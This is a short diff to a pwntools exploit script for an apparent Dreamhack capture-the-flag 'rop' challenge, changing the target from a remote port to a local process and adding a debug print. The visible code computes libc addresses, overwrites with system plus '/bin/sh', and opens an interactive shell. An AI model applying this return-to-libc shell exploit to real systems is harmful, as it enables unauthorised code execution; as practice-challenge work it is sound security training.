@@ -2,12 +2,14 @@
 # Name: rop.py
 from pwn import *
 
+
 def slog(name, addr): return success(': '.join([name, hex(addr)]))
 
-# p = process('./rop')
+
+p = process('./rop')
 # p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
 # p = remote("host3.dreamhack.games", 11501)
-p = remote("localhost", 7182)
+# p = remote("localhost", 7182)
 e = ELF('./rop')
 libc = ELF('./libc.so.6')
 
@@ -53,7 +55,9 @@ system = lb + libc.symbols['system']
 slog('read', read)
 slog('libc_base', lb)
 slog('system', system)
+slog('read - system', read - system)
 
 p.send(p64(system) + b'/bin/sh\x00')
+
 
 p.interactive()
